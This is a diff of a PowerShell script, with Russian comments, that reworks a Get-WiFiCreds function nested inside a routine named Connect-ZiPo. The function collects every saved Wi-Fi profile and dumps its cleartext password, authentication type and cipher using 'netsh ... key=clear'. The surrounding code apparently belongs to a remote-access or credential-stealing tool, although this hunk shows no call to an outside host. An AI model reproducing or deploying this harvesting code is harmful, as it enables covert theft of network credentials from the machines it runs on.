@@ -86,36 +86,51 @@ function Connect-ZiPo {
 
    function Get-WiFiCreds {
     try {
+        # Получаем список профилей Wi-Fi с принудительной сменой кодовой страницы
         $profilesOutput = cmd /c "chcp 65001 >nul & netsh wlan show profiles" | Out-String
-        $profileLines = $profilesOutput -split "`r?`n" | Where-Object {
-            $_ -match "All User Profile" -or $_ -match "Все профили пользователей"
-        }
 
-        if (-not $profileLines) {
-            return "[INFO] No Wi-Fi profiles found."
+        # Используем регулярное выражение для получения имен профилей (поддерживаются английский и русский варианты)
+        $profileRegex = '(?:All User Profile|Все профили пользователей)\s*:\s*(.+)'
+        $profileMatches = [regex]::Matches($profilesOutput, $profileRegex)
+
+        if ($profileMatches.Count -eq 0) {
+            return "[INFO] Wi-Fi профили не найдены."
         }
 
         $results = "`nWi-Fi Credentials:`n"
-        foreach ($line in $profileLines) {
-            $parts = $line -split ":", 2
-            if ($parts.Count -lt 2) { continue }
-            $wifiName = $parts[1].Trim()
-
+        foreach ($match in $profileMatches) {
+            $wifiName = $match.Groups[1].Value.Trim()
             $results += "`nSSID: $wifiName`n"
 
-            # Снова меняем кодировку перед вызовом netsh
-            $detailsCmd = "chcp 65001 >nul & netsh wlan show profile name=""$wifiName"" key=clear"
-            $details = cmd /c $detailsCmd | Out-String
+            # Формируем команду для получения подробной информации по профилю
+            $detailsCmd = "chcp 65001 >nul & netsh wlan show profile name=`"$wifiName`" key=clear"
+            $detailsOutput = cmd /c $detailsCmd | Out-String
 
-            $keyLine = $details -split "`r?`n" | Where-Object {
-                $_ -match "Key Content" -or $_ -match "Содержимое ключа"
+            # Регулярные выражения для извлечения нужных данных
+            $keyRegex    = '(?:Key Content|Содержимое ключа)\s*:\s*(.+)'
+            $authRegex   = '(?:Authentication|Аутентификация)\s*:\s*(.+)'
+            $cipherRegex = '(?:Cipher|Шифрование)\s*:\s*(.+)'
+
+            $keyMatch    = [regex]::Match($detailsOutput, $keyRegex)
+            $authMatch   = [regex]::Match($detailsOutput, $authRegex)
+            $cipherMatch = [regex]::Match($detailsOutput, $cipherRegex)
+
+            if ($keyMatch.Success) {
+                $keyContent = $keyMatch.Groups[1].Value.Trim()
+                $results += "Пароль: $keyContent`n"
+            }
+            else {
+                $results += "Пароль не найден`n"
             }
 
-            if ($keyLine) {
-                $key = ($keyLine -replace ".*:\s*", "").Trim()
-                $results += "Пароль: $key`n"
-            } else {
-                $results += "Пароль не найден`n"
+            if ($authMatch.Success) {
+                $authContent = $authMatch.Groups[1].Value.Trim()
+                $results += "Аутентификация: $authContent`n"
+            }
+
+            if ($cipherMatch.Success) {
+                $cipherContent = $cipherMatch.Groups[1].Value.Trim()
+                $results += "Шифрование: $cipherContent`n"
             }
         }
         return $results
